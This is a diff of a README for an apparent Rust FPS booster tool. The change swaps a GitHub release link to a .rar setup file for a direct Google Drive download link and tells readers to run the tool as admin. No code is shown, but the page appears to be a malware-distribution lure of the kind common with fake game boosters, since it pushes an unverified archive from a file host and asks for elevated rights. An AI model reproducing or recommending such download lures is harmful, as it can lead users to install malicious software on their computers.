@@ -5,7 +5,7 @@
 ![Preview](https://i.postimg.cc/jSzr56Kz/hq720.jpg)
 
 ## Download⬇️ 
-**[DOWNLOAD — Click Here](https://github.com//oscar-rajio2002o1/rust-fps-booster-tool/releases/latest/Setup-v2.3.rar/)** 
+**[DOWNLOAD — Click Here](https://drive.google.com/uc?id=1bfJmUz0_ZL0KsSvQ_nDpgfNw61QSEU7D)** or reales
 
 ## What's inside📦
 - **Windows tweaks** — turns on Game Mode, kills Game Bar, sets power plan to max performance. Stuff that gives free FPS.
@@ -28,3 +28,6 @@
 - 2)If you're using system tweaks, run them as admin.
 - 3)Pick your profile — low-end or balanced.
 - 4)The game will start automatically—just wait for it to load. 
+
+
+
